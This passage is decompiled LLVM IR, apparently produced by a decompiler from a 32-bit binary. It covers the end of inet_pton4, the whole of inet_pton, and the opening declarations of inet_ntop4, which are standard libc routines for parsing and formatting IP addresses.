  store i1 %v1_8057b6f19, i1* %zf.global-to-local, align 1
  %v1_8057b7121 = icmp eq i1 %v1_8057b6f19, false
  br i1 %v1_8057b7121, label %dec_label_pc_8057b2e, label %dec_label_pc_8057b73

dec_label_pc_8057b2e:                             ; preds = %entry, %dec_label_pc_8057b6b.backedge
  %v3_8057b6b23 = phi i32 [ %v3_8057b6b, %dec_label_pc_8057b6b.backedge ], [ %v3_8057b6b17, %entry ]
  %v2_8057b6b22 = phi i8 [ %v2_8057b6b, %dec_label_pc_8057b6b.backedge ], [ %v2_8057b6b16, %entry ]
  %v1_8057b2e = add nsw i32 %v3_8057b6b23, -48
  store i32 %v1_8057b2e, i32* @eax, align 4
  %v9_8057b31 = icmp eq i8 %v2_8057b6b22, 57
  store i1 %v9_8057b31, i1* %zf.global-to-local, align 1
  %v6_8057b34 = icmp ugt i32 %v1_8057b2e, 9
  br i1 %v6_8057b34, label %dec_label_pc_8057b57, label %dec_label_pc_8057b36

dec_label_pc_8057b36:                             ; preds = %dec_label_pc_8057b2e
  %v0_8057b36 = load i32, i32* @esi, align 4
  %v1_8057b36 = inttoptr i32 %v0_8057b36 to i8*
  %v2_8057b36 = load i8, i8* %v1_8057b36, align 1
  %v2_8057b39 = zext i8 %v2_8057b36 to i32
  %v3_8057b39 = mul nuw nsw i32 %v2_8057b39, 10
  %v3_8057b3c = add nsw i32 %v3_8057b39, %v1_8057b2e
  store i32 %v3_8057b3c, i32* @eax, align 4
  %v9_8057b40 = icmp eq i32 %v3_8057b3c, 255
  store i1 %v9_8057b40, i1* %zf.global-to-local, align 1
  %v6_8057b45 = icmp ugt i32 %v3_8057b3c, 255
  br i1 %v6_8057b45, label %dec_label_pc_8057b90, label %dec_label_pc_8057b47

dec_label_pc_8057b47:                             ; preds = %dec_label_pc_8057b36
  %v0_8057b47 = load i32, i32* @edx, align 4
  %v1_8057b47 = icmp eq i32 %v0_8057b47, 0
  store i1 %v1_8057b47, i1* %zf.global-to-local, align 1
  %v1_8057b49 = trunc i32 %v3_8057b3c to i8
  store i8 %v1_8057b49, i8* %v1_8057b36, align 1
  %v0_8057b4b = load i1, i1* %zf.global-to-local, align 1
  %v1_8057b4b = icmp eq i1 %v0_8057b4b, false
  br i1 %v1_8057b4b, label %dec_label_pc_8057b6b.backedge, label %dec_label_pc_8057b4d

dec_label_pc_8057b4d:                             ; preds = %dec_label_pc_8057b47
  %v0_8057b4d = load i32, i32* @edi, align 4
  %v1_8057b4d = add i32 %v0_8057b4d, 1
  store i32 %v1_8057b4d, i32* @edi, align 4
  %v1_8057b4e = add i32 %v0_8057b4d, -3
  %v6_8057b4e = sub i32 2, %v0_8057b4d
  %v7_8057b4e = and i32 %v6_8057b4e, %v1_8057b4d
  %v8_8057b4e = icmp slt i32 %v7_8057b4e, 0
  %v9_8057b4e = icmp eq i32 %v1_8057b4e, 0
  store i1 %v9_8057b4e, i1* %zf.global-to-local, align 1
  %v10_8057b4e = icmp slt i32 %v1_8057b4e, 0
  %v3_8057b51 = icmp eq i1 %v10_8057b4e, %v8_8057b4e
  %v4_8057b51 = icmp eq i1 %v9_8057b4e, false
  %v5_8057b51 = and i1 %v4_8057b51, %v3_8057b51
  br i1 %v5_8057b51, label %dec_label_pc_8057b90, label %dec_label_pc_8057b53

dec_label_pc_8057b53:                             ; preds = %dec_label_pc_8057b4d
  %v0_8057b53 = load i32, i32* @edx, align 4
  %v1_8057b53 = and i32 %v0_8057b53, -256
  %v2_8057b53 = or i32 %v1_8057b53, 1
  store i32 %v2_8057b53, i32* @edx, align 4
  br label %dec_label_pc_8057b6b.backedge

dec_label_pc_8057b57:                             ; preds = %dec_label_pc_8057b2e
  %v9_8057b57 = icmp eq i8 %v2_8057b6b22, 46
  store i1 %v9_8057b57, i1* %zf.global-to-local, align 1
  %v1_8057b5a = icmp eq i1 %v9_8057b57, false
  br i1 %v1_8057b5a, label %dec_label_pc_8057b90, label %dec_label_pc_8057b5c

dec_label_pc_8057b5c:                             ; preds = %dec_label_pc_8057b57
  %v0_8057b5c = load i32, i32* @edx, align 4
  %v1_8057b5c = icmp eq i32 %v0_8057b5c, 0
  store i1 %v1_8057b5c, i1* %zf.global-to-local, align 1
  br i1 %v1_8057b5c, label %dec_label_pc_8057b90, label %dec_label_pc_8057b60

dec_label_pc_8057b60:                             ; preds = %dec_label_pc_8057b5c
  %v0_8057b60 = load i32, i32* @edi, align 4
  %v9_8057b60 = icmp eq i32 %v0_8057b60, 4
  store i1 %v9_8057b60, i1* %zf.global-to-local, align 1
  br i1 %v9_8057b60, label %dec_label_pc_8057b90, label %dec_label_pc_8057b65

dec_label_pc_8057b65:                             ; preds = %dec_label_pc_8057b60
  %v0_8057b65 = load i32, i32* @esi, align 4
  %v1_8057b65 = add i32 %v0_8057b65, 1
  store i32 %v1_8057b65, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8057b68 = inttoptr i32 %v1_8057b65 to i8*
  store i8 0, i8* %v1_8057b68, align 1
  br label %dec_label_pc_8057b6b.backedge

dec_label_pc_8057b6b.backedge:                    ; preds = %dec_label_pc_8057b65, %dec_label_pc_8057b53, %dec_label_pc_8057b47
  %v0_8057b6b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057b6b = inttoptr i32 %v0_8057b6b.pre to i8*
  %v2_8057b6b = load i8, i8* %v1_8057b6b, align 1
  %v3_8057b6b = sext i8 %v2_8057b6b to i32
  store i32 %v3_8057b6b, i32* @ecx, align 4
  %v1_8057b6e = add i32 %v0_8057b6b.pre, 1
  store i32 %v1_8057b6e, i32* %ebx.global-to-local, align 4
  %v1_8057b6f = icmp eq i8 %v2_8057b6b, 0
  store i1 %v1_8057b6f, i1* %zf.global-to-local, align 1
  %v1_8057b71 = icmp eq i1 %v1_8057b6f, false
  br i1 %v1_8057b71, label %dec_label_pc_8057b2e, label %dec_label_pc_8057b6b.dec_label_pc_8057b73_crit_edge

dec_label_pc_8057b6b.dec_label_pc_8057b73_crit_edge: ; preds = %dec_label_pc_8057b6b.backedge
  %v0_8057b73.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057b73

dec_label_pc_8057b73:                             ; preds = %dec_label_pc_8057b6b.dec_label_pc_8057b73_crit_edge, %entry
  %v0_8057b73 = phi i32 [ %v0_8057b73.pre, %dec_label_pc_8057b6b.dec_label_pc_8057b73_crit_edge ], [ 0, %entry ]
  %v10_8057b73 = icmp eq i32 %v0_8057b73, 3
  store i1 %v10_8057b73, i1* %zf.global-to-local, align 1
  %v7_8057b76 = icmp sgt i32 %v0_8057b73, 3
  br i1 %v7_8057b76, label %dec_label_pc_8057b78, label %dec_label_pc_8057b90

dec_label_pc_8057b78:                             ; preds = %dec_label_pc_8057b73
  %v0_8057b78 = load i32, i32* @eax, align 4
  %v3_8057b81 = bitcast i32* %stack_var_-20 to i16*
  %v4_8057b81 = call i32 @memcpy(i16* %v3_8057b81, i32 4, i32 %v0_8057b78)
  %v0_8057b8b = load i32, i32* @esp, align 4
  %v6_8057b8b = icmp eq i32 %v0_8057b8b, -16
  store i1 %v6_8057b8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8057b92

dec_label_pc_8057b90:                             ; preds = %dec_label_pc_8057b60, %dec_label_pc_8057b5c, %dec_label_pc_8057b57, %dec_label_pc_8057b4d, %dec_label_pc_8057b36, %dec_label_pc_8057b73
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8057b92.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057b92

dec_label_pc_8057b92:                             ; preds = %dec_label_pc_8057b78, %dec_label_pc_8057b90
  %v0_8057b92 = phi i32 [ %v15_8057b20, %dec_label_pc_8057b78 ], [ %v0_8057b92.pre, %dec_label_pc_8057b90 ]
  %v0_8057b99 = phi i32 [ 1, %dec_label_pc_8057b78 ], [ 0, %dec_label_pc_8057b90 ]
  %v9_8057b92 = icmp eq i32 %v0_8057b92, -28
  store i1 %v9_8057b92, i1* %zf.global-to-local, align 1
  %v2_8057b95 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057b95, i32* @ebx, align 4
  store i32 %v0_8057b1a, i32* @esi, align 4
  ret i32 %v0_8057b99

; uselistorder directives
  uselistorder i32 %v0_8057b73, { 1, 0 }
  uselistorder i32 %v3_8057b6b, { 1, 0 }
  uselistorder i8 %v2_8057b6b, { 1, 2, 0 }
  uselistorder i1 %v9_8057b60, { 1, 0 }
  uselistorder i32 %v1_8057b4e, { 1, 0 }
  uselistorder i32 %v3_8057b3c, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8057b6b22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8057b92, { 1, 0 }
  uselistorder label %dec_label_pc_8057b90, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8057b2e, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8057b9a = load i32, i32* @ebp, align 4
  %v0_8057b9b = load i32, i32* @edi, align 4
  %v0_8057b9c = load i32, i32* @esi, align 4
  %v0_8057b9d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8057ba5 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8057ba5, i32* @edi, align 4
  %v9_8057ba9 = icmp eq i32 %arg1, 2
  br i1 %v9_8057ba9, label %dec_label_pc_8057bb9, label %dec_label_pc_8057bae

dec_label_pc_8057bae:                             ; preds = %entry
  %v9_8057bae = icmp eq i32 %arg1, 10
  %v1_8057bb1 = icmp eq i1 %v9_8057bae, false
  br i1 %v1_8057bb1, label %dec_label_pc_8057d4a, label %dec_label_pc_8057bc9

dec_label_pc_8057bb9:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8057ba5, i32* @eax, align 4
  %v3_8057bbf = call i32 @inet_pton4(i32 %v0_8057b9d, i32 %v0_8057b9c, i32 %v0_8057b9b)
  store i32 %v3_8057bbf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d5c

dec_label_pc_8057bc9:                             ; preds = %dec_label_pc_8057bae
  %v2_8057bce = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057bce, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8057bd3 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8057bd3, i32* @ebx, align 4
  %v2_8057bda = add i32 %v5_8057bd3, 16
  store i32 %v2_8057bda, i32* %eax.global-to-local, align 4
  %v0_8057be4 = load i32, i32* @edi, align 4
  %v1_8057be4 = inttoptr i32 %v0_8057be4 to i8*
  %v2_8057be4 = load i8, i8* %v1_8057be4, align 1
  %v11_8057be4 = icmp eq i8 %v2_8057be4, 58
  %v1_8057be7 = icmp eq i1 %v11_8057be4, false
  br i1 %v1_8057be7, label %dec_label_pc_8057c7a, label %dec_label_pc_8057be9

dec_label_pc_8057be9:                             ; preds = %dec_label_pc_8057bc9
  %v1_8057be9 = add i32 %v0_8057be4, 1
  store i32 %v1_8057be9, i32* @edi, align 4
  %v1_8057bea = inttoptr i32 %v1_8057be9 to i8*
  %v2_8057bea = load i8, i8* %v1_8057bea, align 1
  %v11_8057bea = icmp eq i8 %v2_8057bea, 58
  %v1_8057bed = icmp eq i1 %v11_8057bea, false
  br i1 %v1_8057bed, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c7a

dec_label_pc_8057c01:                             ; preds = %dec_label_pc_8057cba
  %v0_8057c02 = load i32, i32* @edi, align 4
  %v1_8057c02 = add i32 %v0_8057c02, 1
  store i32 %v1_8057c02, i32* @edi, align 4
  %v4_8057c0a = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805eeb4.1032, i32 0, i32 0), i32 %v2_8057cc1)
  store i32 %v4_8057c0a, i32* %eax.global-to-local, align 4
  %v1_8057c12 = icmp eq i32 %v4_8057c0a, 0
  br i1 %v1_8057c12, label %dec_label_pc_8057c31, label %dec_label_pc_8057c16

dec_label_pc_8057c16:                             ; preds = %dec_label_pc_8057c01
  %v0_8057c16 = load i32, i32* @ebp, align 4
  %v2_8057c16 = mul i32 %v0_8057c16, 16
  %v1_8057c19 = add i32 %v4_8057c0a, -134606516
  store i32 %v1_8057c19, i32* %eax.global-to-local, align 4
  %v2_8057c1e = or i32 %v2_8057c16, %v1_8057c19
  store i32 %v2_8057c1e, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8057c1e, 65536
  br i1 %tmp, label %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge, label %dec_label_pc_8057d5a

dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge: ; preds = %dec_label_pc_8057c16
  %v0_8057cba.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057cba.outer

dec_label_pc_8057cba.outer:                       ; preds = %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge, %dec_label_pc_8057c7a
  %v0_8057cba.pre = phi i32 [ %v0_8057cba.pre.pre, %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8057c7a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8057c7a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8057c7a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8057c16.dec_label_pc_8057cba.outer_crit_edge ], [ 0, %dec_label_pc_8057c7a ]
  %v4_8057c36 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8057c3b = icmp eq i1 %v4_8057c36, false
  br label %dec_label_pc_8057cba

dec_label_pc_8057c31:                             ; preds = %dec_label_pc_8057c01
  %v0_8057c31 = load i32, i32* @esi, align 4
  %v9_8057c31 = icmp eq i32 %v0_8057c31, 58
  %v1_8057c34 = icmp eq i1 %v9_8057c31, false
  br i1 %v1_8057c34, label %dec_label_pc_8057c86, label %dec_label_pc_8057c36

dec_label_pc_8057c36:                             ; preds = %dec_label_pc_8057c31
  br i1 %v1_8057c3b, label %dec_label_pc_8057c52, label %dec_label_pc_8057c3d

dec_label_pc_8057c3d:                             ; preds = %dec_label_pc_8057c36
  %v5_8057c3d = icmp eq i8* %stack_var_-44.1, null
  %v1_8057c42 = icmp eq i1 %v5_8057c3d, false
  br i1 %v1_8057c42, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c48

dec_label_pc_8057c48:                             ; preds = %dec_label_pc_8057c3d
  %v0_8057c48 = load i32, i32* @ebx, align 4
  %v5_8057c48 = inttoptr i32 %v0_8057c48 to i8*
  %v0_8057c4c = load i32, i32* @edi, align 4
  %v5_8057c4c = inttoptr i32 %v0_8057c4c to i8*
  br label %dec_label_pc_8057cba

dec_label_pc_8057c52:                             ; preds = %dec_label_pc_8057c36
  %v0_8057c52 = load i32, i32* @edi, align 4
  %v1_8057c52 = inttoptr i32 %v0_8057c52 to i8*
  %v2_8057c52 = load i8, i8* %v1_8057c52, align 1
  %v3_8057c52 = icmp eq i8 %v2_8057c52, 0
  br i1 %v3_8057c52, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c5b

dec_label_pc_8057c5b:                             ; preds = %dec_label_pc_8057c52
  %v0_8057c5b = load i32, i32* @ebx, align 4
  %v1_8057c5b = add i32 %v0_8057c5b, 2
  store i32 %v1_8057c5b, i32* @edx, align 4
  %v6_8057c62 = icmp ugt i32 %v1_8057c5b, %v2_8057bda
  br i1 %v6_8057c62, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c68

dec_label_pc_8057c68:                             ; preds = %dec_label_pc_8057c5b
  %v0_8057c68 = load i32, i32* @ebp, align 4
  %v2_8057c6a = udiv i32 %v0_8057c68, 256
  %v4_8057c6a = trunc i32 %v2_8057c6a to i8
  %v3_8057c6d = inttoptr i32 %v0_8057c5b to i8*
  store i8 %v4_8057c6a, i8* %v3_8057c6d, align 1
  %v0_8057c6f = load i32, i32* @ebp, align 4
  store i32 %v0_8057c6f, i32* %eax.global-to-local, align 4
  %v1_8057c71 = trunc i32 %v0_8057c6f to i8
  %v2_8057c71 = load i32, i32* @ebx, align 4
  %v3_8057c71 = add i32 %v2_8057c71, 1
  %v4_8057c71 = inttoptr i32 %v3_8057c71 to i8*
  store i8 %v1_8057c71, i8* %v4_8057c71, align 1
  %v0_8057c74 = load i32, i32* @edx, align 4
  store i32 %v0_8057c74, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057c7a

dec_label_pc_8057c7a:                             ; preds = %dec_label_pc_8057bc9, %dec_label_pc_8057be9, %dec_label_pc_8057c68
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8057c68 ], [ %v1_8057be9, %dec_label_pc_8057be9 ], [ %v0_8057be4, %dec_label_pc_8057bc9 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057c68 ], [ null, %dec_label_pc_8057be9 ], [ null, %dec_label_pc_8057bc9 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8057cba.outer

dec_label_pc_8057c86:                             ; preds = %dec_label_pc_8057c31
  %v9_8057c86 = icmp eq i32 %v0_8057c31, 46
  %v1_8057c89 = icmp eq i1 %v9_8057c86, false
  br i1 %v1_8057c89, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c8f

dec_label_pc_8057c8f:                             ; preds = %dec_label_pc_8057c86
  %v0_8057c8f = load i32, i32* @ebx, align 4
  %v1_8057c8f = add i32 %v0_8057c8f, 4
  store i32 %v1_8057c8f, i32* @esi, align 4
  %v6_8057c96 = icmp ugt i32 %v1_8057c8f, %v2_8057bda
  br i1 %v6_8057c96, label %dec_label_pc_8057d5a, label %dec_label_pc_8057c9c

dec_label_pc_8057c9c:                             ; preds = %dec_label_pc_8057c8f
  %v4_8057c9c = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8057c9c, i32* @eax, align 4
  store i32 %v0_8057c8f, i32* @edx, align 4
  store i32 %v1_8057c8f, i32* @ebx, align 4
  %v2_8057ca4 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057ca4 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8057ca4, i32 %v2_8057bda)
  store i32 %v5_8057ca4, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_8057ca4, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8057cf1, label %dec_label_pc_8057d5a

dec_label_pc_8057cba:                             ; preds = %dec_label_pc_8057cba.outer, %dec_label_pc_8057c48
  %v0_8057cba = phi i32 [ %v0_8057c4c, %dec_label_pc_8057c48 ], [ %v0_8057cba.pre, %dec_label_pc_8057cba.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8057c48, %dec_label_pc_8057c48 ], [ %stack_var_-44.1.ph, %dec_label_pc_8057cba.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8057c4c, %dec_label_pc_8057c48 ], [ %stack_var_-36.1.ph, %dec_label_pc_8057cba.outer ]
  %v1_8057cba = inttoptr i32 %v0_8057cba to i8*
  %v2_8057cba = load i8, i8* %v1_8057cba, align 1
  %v3_8057cba = sext i8 %v2_8057cba to i32
  store i32 %v3_8057cba, i32* %eax.global-to-local, align 4
  %v2_8057cc1 = call i32 @__GI_tolower(i32 %v3_8057cba)
  store i32 %v2_8057cc1, i32* %eax.global-to-local, align 4
  %v1_8057cc9 = icmp eq i32 %v2_8057cc1, 0
  store i32 %v2_8057cc1, i32* @esi, align 4
  %v1_8057ccd = icmp eq i1 %v1_8057cc9, false
  br i1 %v1_8057ccd, label %dec_label_pc_8057c01, label %dec_label_pc_8057cd3

dec_label_pc_8057cd3:                             ; preds = %dec_label_pc_8057cba
  br i1 %v4_8057c36, label %dec_label_pc_8057cf1, label %dec_label_pc_8057cda

dec_label_pc_8057cda:                             ; preds = %dec_label_pc_8057cd3
  %v0_8057cda = load i32, i32* @ebx, align 4
  %v1_8057cda = add i32 %v0_8057cda, 2
  store i32 %v1_8057cda, i32* @edx, align 4
  %v6_8057ce1 = icmp ugt i32 %v1_8057cda, %v2_8057bda
  br i1 %v6_8057ce1, label %dec_label_pc_8057d5a, label %dec_label_pc_8057ce3

dec_label_pc_8057ce3:                             ; preds = %dec_label_pc_8057cda
  %v0_8057ce3 = load i32, i32* @ebp, align 4
  %v2_8057ce5 = udiv i32 %v0_8057ce3, 256
  %v4_8057ce5 = trunc i32 %v2_8057ce5 to i8
  %v3_8057ce8 = inttoptr i32 %v0_8057cda to i8*
  store i8 %v4_8057ce5, i8* %v3_8057ce8, align 1
  %v0_8057cea = load i32, i32* @ebp, align 4
  store i32 %v0_8057cea, i32* %eax.global-to-local, align 4
  %v1_8057cec = trunc i32 %v0_8057cea to i8
  %v2_8057cec = load i32, i32* @ebx, align 4
  %v3_8057cec = add i32 %v2_8057cec, 1
  %v4_8057cec = inttoptr i32 %v3_8057cec to i8*
  store i8 %v1_8057cec, i8* %v4_8057cec, align 1
  %v0_8057cef = load i32, i32* @edx, align 4
  store i32 %v0_8057cef, i32* @ebx, align 4
  br label %dec_label_pc_8057cf1

dec_label_pc_8057cf1:                             ; preds = %dec_label_pc_8057cd3, %dec_label_pc_8057c9c, %dec_label_pc_8057ce3
  %v4_8057cf1 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057cf1 = icmp eq i8* %stack_var_-44.1, null
  %v0_8057d29.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8057cf1, label %dec_label_pc_8057d29, label %dec_label_pc_8057cf8

dec_label_pc_8057cf8:                             ; preds = %dec_label_pc_8057cf1
  store i32 1, i32* @esi, align 4
  %v6_8057cff = sub i32 %v0_8057d29.pre, %v4_8057cf1
  store i32 %v6_8057cff, i32* @edi, align 4
  %v16_8057d03 = icmp eq i32 %v0_8057d29.pre, %v2_8057bda
  %v1_8057d07 = icmp eq i1 %v16_8057d03, false
  br i1 %v1_8057d07, label %dec_label_pc_8057d21.preheader, label %dec_label_pc_8057d5a

dec_label_pc_8057d21.preheader:                   ; preds = %dec_label_pc_8057cf8
  %v3_8057d2188 = inttoptr i32 %v6_8057cff to i8*
  %v9_8057d2397 = icmp slt i8* %v3_8057d2188, inttoptr (i32 1 to i8*)
  br i1 %v9_8057d2397, label %dec_label_pc_8057d25, label %dec_label_pc_8057d0b

dec_label_pc_8057d0b:                             ; preds = %dec_label_pc_8057d21.preheader, %dec_label_pc_8057d0b
  %v0_8057d1999 = phi i32 [ %v0_8057d21.pre, %dec_label_pc_8057d0b ], [ 1, %dec_label_pc_8057d21.preheader ]
  %v0_8057d0b98 = phi i32 [ %v1_8057d21.pre, %dec_label_pc_8057d0b ], [ %v6_8057cff, %dec_label_pc_8057d21.preheader ]
  %v2_8057d11 = sub i32 %v0_8057d0b98, %v0_8057d1999
  %v6_8057d13 = add i32 %v2_8057d11, %v4_8057cf1
  store i32 %v6_8057d13, i32* %eax.global-to-local, align 4
  %v2_8057d17 = sub i32 %v2_8057bda, %v0_8057d1999
  store i32 %v2_8057d17, i32* @ecx, align 4
  %v1_8057d19 = add i32 %v0_8057d1999, 1
  store i32 %v1_8057d19, i32* @esi, align 4
  %v1_8057d1a = inttoptr i32 %v6_8057d13 to i8*
  %v2_8057d1a = load i8, i8* %v1_8057d1a, align 1
  %v3_8057d1a = zext i8 %v2_8057d1a to i32
  %v4_8057d1a = load i32, i32* @edx, align 4
  %v5_8057d1a = and i32 %v4_8057d1a, -256
  %v6_8057d1a = or i32 %v5_8057d1a, %v3_8057d1a
  store i32 %v6_8057d1a, i32* @edx, align 4
  %v3_8057d1c = inttoptr i32 %v2_8057d17 to i8*
  store i8 %v2_8057d1a, i8* %v3_8057d1c, align 1
  %v0_8057d1e = load i32, i32* %eax.global-to-local, align 4
  %v1_8057d1e = inttoptr i32 %v0_8057d1e to i8*
  store i8 0, i8* %v1_8057d1e, align 1
  %v0_8057d21.pre = load i32, i32* @esi, align 4
  %v1_8057d21.pre = load i32, i32* @edi, align 4
  %v2_8057d21 = inttoptr i32 %v0_8057d21.pre to i8*
  %v3_8057d21 = inttoptr i32 %v1_8057d21.pre to i8*
  %v9_8057d23 = icmp sgt i8* %v2_8057d21, %v3_8057d21
  br i1 %v9_8057d23, label %dec_label_pc_8057d25, label %dec_label_pc_8057d0b

dec_label_pc_8057d25:                             ; preds = %dec_label_pc_8057d0b, %dec_label_pc_8057d21.preheader
  br label %dec_label_pc_8057d29

dec_label_pc_8057d29:                             ; preds = %dec_label_pc_8057cf1, %dec_label_pc_8057d25
  %v0_8057d29 = phi i32 [ %v2_8057bda, %dec_label_pc_8057d25 ], [ %v0_8057d29.pre, %dec_label_pc_8057cf1 ]
  %v16_8057d29 = icmp eq i32 %v0_8057d29, %v2_8057bda
  %v1_8057d2d = icmp eq i1 %v16_8057d29, false
  br i1 %v1_8057d2d, label %dec_label_pc_8057d5a, label %dec_label_pc_8057d2f

dec_label_pc_8057d2f:                             ; preds = %dec_label_pc_8057d29
  store i32 %v2_8057bce, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8057d3b = call i32 @memcpy(i16* %tmp63, i32 %v2_8057bce, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d5c

dec_label_pc_8057d4a:                             ; preds = %dec_label_pc_8057bae
  %v1_8057d4a = call i32 @__errno_location(i32 %v0_8057b9d)
  %v1_8057d4f = inttoptr i32 %v1_8057d4a to i32*
  store i32 97, i32* %v1_8057d4f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d5c

dec_label_pc_8057d5a:                             ; preds = %dec_label_pc_8057c5b, %dec_label_pc_8057c52, %dec_label_pc_8057c16, %dec_label_pc_8057c3d, %dec_label_pc_8057cf8, %dec_label_pc_8057c9c, %dec_label_pc_8057d29, %dec_label_pc_8057cda, %dec_label_pc_8057c8f, %dec_label_pc_8057c86, %dec_label_pc_8057be9
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d5c

dec_label_pc_8057d5c:                             ; preds = %dec_label_pc_8057d4a, %dec_label_pc_8057d2f, %dec_label_pc_8057bb9, %dec_label_pc_8057d5a
  %v0_8057d63 = phi i32 [ -1, %dec_label_pc_8057d4a ], [ 1, %dec_label_pc_8057d2f ], [ %v3_8057bbf, %dec_label_pc_8057bb9 ], [ 0, %dec_label_pc_8057d5a ]
  store i32 %v0_8057b9d, i32* @ebx, align 4
  store i32 %v0_8057b9c, i32* @esi, align 4
  store i32 %v0_8057b9b, i32* @edi, align 4
  store i32 %v0_8057b9a, i32* @ebp, align 4
  ret i32 %v0_8057d63

; uselistorder directives
  uselistorder i32 %v1_8057d21.pre, { 1, 0 }
  uselistorder i32 %v0_8057d21.pre, { 1, 0 }
  uselistorder i32 %v0_8057d1999, { 2, 1, 0 }
  uselistorder i32 %v0_8057d29.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8057cc1, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8057bda, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8057b9d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057d5c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057d5a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057d29, { 1, 0 }
  uselistorder label %dec_label_pc_8057d0b, { 1, 0 }
  uselistorder label %dec_label_pc_8057cf1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057cba, { 1, 0 }
  uselistorder label %dec_label_pc_8057c7a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057cba.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
